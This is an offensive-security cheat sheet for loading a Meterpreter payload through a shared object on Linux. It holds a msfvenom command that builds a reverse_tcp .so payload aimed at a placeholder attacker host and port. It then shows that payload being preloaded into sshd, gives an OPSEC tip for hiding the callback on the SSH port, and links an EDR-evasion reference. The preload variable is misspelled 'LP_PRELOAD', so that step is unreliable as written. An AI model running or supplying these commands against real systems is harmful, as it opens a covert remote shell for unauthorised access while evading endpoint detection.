# SO Execution

## 01 - Generate Payload

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf-so > payload.so
```

## 02 - Execute Payloads

### 2.1 - SSH Server

> [!TIP] OPSEC Consideration
> When using a reverse shell payload module. Ensure the listening port is the same as SSH daemon server.

```
$ LP_PRELOAD=/path/to/payload.so sshd
```

---
## References

### Tony Lambert

- [Tony Lambert: Linux EDR Evasion With Meterpreter and LD_PRELOAD](https://forensicitguy.github.io/linux-edr-evasion-meterpreter-ld-preload/)